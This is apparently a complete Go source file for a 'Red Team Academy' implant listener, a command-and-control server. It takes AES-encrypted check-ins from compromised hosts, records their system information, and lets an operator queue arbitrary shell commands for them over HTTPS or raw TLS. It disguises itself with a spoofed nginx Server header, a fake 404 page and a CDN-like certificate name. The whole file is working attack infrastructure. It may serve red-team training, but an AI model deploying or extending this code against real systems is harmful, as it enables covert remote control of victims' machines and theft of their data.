// rta-implant listener — C2 server that receives callbacks from the implant.
// Run on your attacker machine (Kali/Parrot).
//
// Usage:
//   # Generate self-signed TLS cert first:
//   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
//     -days 365 -nodes -subj "/CN=cdn.example.com"
//
//   # Start the listener:
//   go run cmd/listener/main.go \
//     --lhost 0.0.0.0 --lport 443 \
//     --key <same-hex-key-from-builder> \
//     --cert cert.pem --keyfile key.pem
//
//   # Or for raw TLS mode:
//   go run cmd/listener/main.go \
//     --lhost 0.0.0.0 --lport 443 \
//     --key <hex-key> --mode raw-tls \
//     --cert cert.pem --keyfile key.pem

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// ── Agent State ─────────────────────────────────────────────────────────────

type Agent struct {
	ID         string
	SysInfo    string
	LastSeen   time.Time
	PendingCmd string
	LastResult string
}

var (
	agents   = make(map[string]*Agent)
	agentsMu sync.RWMutex
	aesKey   []byte

	// Currently selected agent for interactive shell
	currentAgent   string
	currentAgentMu sync.RWMutex
)

// ── AES-256-GCM ─────────────────────────────────────────────────────────────

func aesEncrypt(key, plaintext []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return "", err
	}
	sealed := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(sealed), nil
}

func aesDecrypt(key []byte, encoded string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("data too short")
	}
	nonce := data[:gcm.NonceSize()]
	ct := data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

// ── HTTPS Handler: GET /api/v1/status ───────────────────────────────────────
// Implant checks in here. We return a pending command or "IDLE".

func handleCheckin(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		http.Error(w, "bad request", 400)
		return
	}

	agentsMu.Lock()
	agent, exists := agents[id]
	if !exists {
		agent = &Agent{ID: id, LastSeen: time.Now()}
		agents[id] = agent

		// Check for sysinfo in cookie
		if cookie := r.Header.Get("Cookie"); cookie != "" {
			for _, c := range strings.Split(cookie, ";") {
				c = strings.TrimSpace(c)
				if strings.HasPrefix(c, "session=") {
					encoded := strings.TrimPrefix(c, "session=")
					if plain, err := aesDecrypt(aesKey, encoded); err == nil {
						agent.SysInfo = string(plain)
					}
				}
			}
		}

		fmt.Printf("\n[+] New agent: %s\n", id)
		if agent.SysInfo != "" {
			fmt.Printf("    %s\n", strings.ReplaceAll(strings.TrimSpace(agent.SysInfo), "\n", "\n    "))
		}
		fmt.Print("\nrta> ")
	}
	agent.LastSeen = time.Now()

	// Check for pending command
	cmd := agent.PendingCmd
	agent.PendingCmd = ""
	agentsMu.Unlock()

	if cmd == "" {
		cmd = "IDLE"
	}

	encrypted, err := aesEncrypt(aesKey, []byte(cmd))
	if err != nil {
		http.Error(w, "internal error", 500)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Server", "nginx/1.24.0")
	w.Write([]byte(encrypted))
}

// ── HTTPS Handler: POST /api/v1/result ──────────────────────────────────────
// Implant posts command output here.

func handleResult(w http.ResponseWriter, r *http.Request) {
	// Extract agent ID from cookie
	var id string
	if cookie := r.Header.Get("Cookie"); cookie != "" {
		for _, c := range strings.Split(cookie, ";") {
			c = strings.TrimSpace(c)
			if strings.HasPrefix(c, "id=") {
				id = strings.TrimPrefix(c, "id=")
			}
		}
	}
	if id == "" {
		http.Error(w, "bad request", 400)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	plaintext, err := aesDecrypt(aesKey, strings.TrimSpace(string(body)))
	if err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	agentsMu.Lock()
	if agent, ok := agents[id]; ok {
		agent.LastResult = string(plaintext)
		agent.LastSeen = time.Now()
	}
	agentsMu.Unlock()

	// Print result
	result := string(plaintext)
	fmt.Printf("\n[%s] Result:\n%s\n", id[:8], result)
	fmt.Print("\nrta> ")

	w.WriteHeader(200)
	w.Write([]byte("OK"))
}

// ── Raw TLS Listener ────────────────────────────────────────────────────────

func rawTLSListener(lhost, lport, certFile, keyFile string) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		fmt.Printf("[-] Failed to load TLS cert: %v\n", err)
		os.Exit(1)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	listener, err := tls.Listen("tcp", net.JoinHostPort(lhost, lport), tlsConfig)
	if err != nil {
		fmt.Printf("[-] Failed to start listener: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Raw TLS listener on %s:%s\n", lhost, lport)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleRawTLSConn(conn)
	}
}

func handleRawTLSConn(conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)

	// First message should be CHECKIN
	if !scanner.Scan() {
		return
	}

	plaintext, err := aesDecrypt(aesKey, strings.TrimSpace(scanner.Text()))
	if err != nil {
		return
	}

	msg := string(plaintext)
	parts := strings.SplitN(msg, "|", 3)
	if len(parts) < 2 || parts[0] != "CHECKIN" {
		return
	}

	id := parts[1]
	sysinfo := ""
	if len(parts) == 3 {
		sysinfo = parts[2]
	}

	agentsMu.Lock()
	agent, exists := agents[id]
	if !exists {
		agent = &Agent{ID: id, SysInfo: sysinfo, LastSeen: time.Now()}
		agents[id] = agent
		fmt.Printf("\n[+] New agent (raw-tls): %s\n", id)
		if sysinfo != "" {
			fmt.Printf("    %s\n", strings.ReplaceAll(strings.TrimSpace(sysinfo), "\n", "\n    "))
		}
		fmt.Print("\nrta> ")
	}
	agent.LastSeen = time.Now()
	agentsMu.Unlock()

	// Interactive loop — send commands and receive results
	for {
		agentsMu.RLock()
		cmd := agent.PendingCmd
		agentsMu.RUnlock()

		if cmd != "" {
			agentsMu.Lock()
			agent.PendingCmd = ""
			agentsMu.Unlock()

			encrypted, _ := aesEncrypt(aesKey, []byte(cmd))
			conn.Write([]byte(encrypted + "\n"))

			// Read response
			if scanner.Scan() {
				result, err := aesDecrypt(aesKey, strings.TrimSpace(scanner.Text()))
				if err == nil {
					agentsMu.Lock()
					agent.LastResult = string(result)
					agentsMu.Unlock()
					fmt.Printf("\n[%s] Result:\n%s\n", id[:8], string(result))
					fmt.Print("\nrta> ")
				}
			} else {
				return // connection lost
			}
		} else {
			// Send IDLE
			encrypted, _ := aesEncrypt(aesKey, []byte("IDLE"))
			conn.Write([]byte(encrypted + "\n"))
			time.Sleep(1 * time.Second)
		}
	}
}

// ── Interactive CLI ─────────────────────────────────────────────────────────

func interactiveCLI() {
	scanner := bufio.NewScanner(os.Stdin)

	fmt.Println()
	fmt.Println("Commands:")
	fmt.Println("  agents           — List connected agents")
	fmt.Println("  use <id>         — Select an agent for interaction")
	fmt.Println("  cmd <command>    — Send a command to the selected agent")
	fmt.Println("  info             — Show selected agent info")
	fmt.Println("  result           — Show last result from selected agent")
	fmt.Println("  kill             — Send exit command to selected agent")
	fmt.Println("  exit             — Shutdown listener")
	fmt.Println("  <anything else>  — Sent as command to selected agent")
	fmt.Println()

	for {
		fmt.Print("rta> ")
		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		cmd := parts[0]

		switch cmd {
		case "agents":
			agentsMu.RLock()
			if len(agents) == 0 {
				fmt.Println("[-] No agents connected")
			} else {
				fmt.Printf("\n%-18s %-20s %-10s\n", "ID", "Last Seen", "Pending")
				fmt.Println(strings.Repeat("-", 50))
				for id, agent := range agents {
					ago := time.Since(agent.LastSeen).Round(time.Second)
					pending := "none"
					if agent.PendingCmd != "" {
						pending = agent.PendingCmd[:min(20, len(agent.PendingCmd))]
					}
					marker := "  "
					currentAgentMu.RLock()
					if id == currentAgent {
						marker = "* "
					}
					currentAgentMu.RUnlock()
					fmt.Printf("%s%-16s %-20s %-10s\n", marker, id[:16], ago.String()+" ago", pending)
				}
			}
			agentsMu.RUnlock()

		case "use":
			if len(parts) < 2 {
				fmt.Println("[-] Usage: use <agent-id-prefix>")
				continue
			}
			prefix := parts[1]
			agentsMu.RLock()
			found := ""
			for id := range agents {
				if strings.HasPrefix(id, prefix) {
					found = id
					break
				}
			}
			agentsMu.RUnlock()
			if found == "" {
				fmt.Printf("[-] No agent matching '%s'\n", prefix)
			} else {
				currentAgentMu.Lock()
				currentAgent = found
				currentAgentMu.Unlock()
				fmt.Printf("[+] Selected agent: %s\n", found[:16])
			}

		case "info":
			currentAgentMu.RLock()
			ca := currentAgent
			currentAgentMu.RUnlock()
			if ca == "" {
				fmt.Println("[-] No agent selected. Use: use <id>")
				continue
			}
			agentsMu.RLock()
			if agent, ok := agents[ca]; ok {
				fmt.Printf("ID:        %s\n", agent.ID)
				fmt.Printf("Last Seen: %s\n", agent.LastSeen.Format(time.RFC3339))
				if agent.SysInfo != "" {
					fmt.Printf("SysInfo:\n    %s\n",
						strings.ReplaceAll(strings.TrimSpace(agent.SysInfo), "\n", "\n    "))
				}
			}
			agentsMu.RUnlock()

		case "result":
			currentAgentMu.RLock()
			ca := currentAgent
			currentAgentMu.RUnlock()
			if ca == "" {
				fmt.Println("[-] No agent selected")
				continue
			}
			agentsMu.RLock()
			if agent, ok := agents[ca]; ok {
				if agent.LastResult != "" {
					fmt.Println(agent.LastResult)
				} else {
					fmt.Println("[-] No result yet")
				}
			}
			agentsMu.RUnlock()

		case "kill":
			currentAgentMu.RLock()
			ca := currentAgent
			currentAgentMu.RUnlock()
			if ca == "" {
				fmt.Println("[-] No agent selected")
				continue
			}
			agentsMu.Lock()
			if agent, ok := agents[ca]; ok {
				agent.PendingCmd = "exit"
				fmt.Printf("[+] Kill command queued for %s\n", ca[:16])
			}
			agentsMu.Unlock()

		case "exit":
			fmt.Println("[*] Shutting down...")
			os.Exit(0)

		case "cmd":
			if len(parts) < 2 {
				fmt.Println("[-] Usage: cmd <command>")
				continue
			}
			currentAgentMu.RLock()
			ca := currentAgent
			currentAgentMu.RUnlock()
			if ca == "" {
				fmt.Println("[-] No agent selected. Use: use <id>")
				continue
			}
			shellCmd := strings.Join(parts[1:], " ")
			agentsMu.Lock()
			if agent, ok := agents[ca]; ok {
				agent.PendingCmd = shellCmd
				fmt.Printf("[+] Command queued: %s\n", shellCmd)
			}
			agentsMu.Unlock()

		default:
			// Anything else is sent as a command to the selected agent
			currentAgentMu.RLock()
			ca := currentAgent
			currentAgentMu.RUnlock()
			if ca == "" {
				fmt.Println("[-] No agent selected. Use: use <id>")
				continue
			}
			agentsMu.Lock()
			if agent, ok := agents[ca]; ok {
				agent.PendingCmd = input
				fmt.Printf("[+] Command queued: %s\n", input)
			}
			agentsMu.Unlock()
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── Main ────────────────────────────────────────────────────────────────────

func main() {
	lhost := flag.String("lhost", "0.0.0.0", "Listen address")
	lport := flag.String("lport", "443", "Listen port")
	key := flag.String("key", "", "AES-256 hex key (must match builder)")
	certFile := flag.String("cert", "cert.pem", "TLS certificate file")
	keyFile := flag.String("keyfile", "key.pem", "TLS private key file")
	mode := flag.String("mode", "https", "Listener mode: https, raw-tls")
	flag.Parse()

	if *key == "" {
		fmt.Println("[-] --key is required (same key used with the builder)")
		flag.Usage()
		os.Exit(1)
	}

	var err error
	aesKey, err = hex.DecodeString(*key)
	if err != nil || len(aesKey) != 32 {
		fmt.Println("[-] Key must be 64 hex characters (32 bytes)")
		os.Exit(1)
	}

	fmt.Println()
	fmt.Println("  ┌─────────────────────────────────────────────┐")
	fmt.Println("  │     RTA Implant Listener                    │")
	fmt.Println("  │     Red Team Academy                        │")
	fmt.Println("  └─────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Printf("[*] Mode:      %s\n", *mode)
	fmt.Printf("[*] Listening: %s:%s\n", *lhost, *lport)
	fmt.Printf("[*] Key:       %s...%s\n", (*key)[:8], (*key)[len(*key)-8:])

	if *mode == "raw-tls" {
		go rawTLSListener(*lhost, *lport, *certFile, *keyFile)
	} else {
		// HTTPS mode
		mux := http.NewServeMux()
		mux.HandleFunc("/api/v1/status", handleCheckin)
		mux.HandleFunc("/api/v1/result", handleResult)
		// Catch-all returns a plausible 404 page
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Server", "nginx/1.24.0")
			w.WriteHeader(404)
			w.Write([]byte("<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx/1.24.0</center></body></html>"))
		})

		server := &http.Server{
			Addr:    net.JoinHostPort(*lhost, *lport),
			Handler: mux,
		}

		go func() {
			if err := server.ListenAndServeTLS(*certFile, *keyFile); err != nil {
				fmt.Printf("[-] HTTPS server error: %v\n", err)
				fmt.Println("[*] Generate certs: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=cdn.example.com'")
				os.Exit(1)
			}
		}()
	}

	// Start interactive CLI
	interactiveCLI()
}
